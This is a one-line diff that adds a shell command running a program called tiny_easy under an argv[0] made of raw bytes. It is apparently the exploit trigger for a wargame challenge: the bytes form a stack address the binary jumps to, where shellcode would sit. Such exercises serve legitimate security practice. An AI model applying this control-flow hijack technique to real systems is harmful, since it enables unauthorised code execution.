@@ -1,0 +1,1 @@
+﻿exec -a `printf "\x10\x10\xc0\xff"` ~/tiny_easy
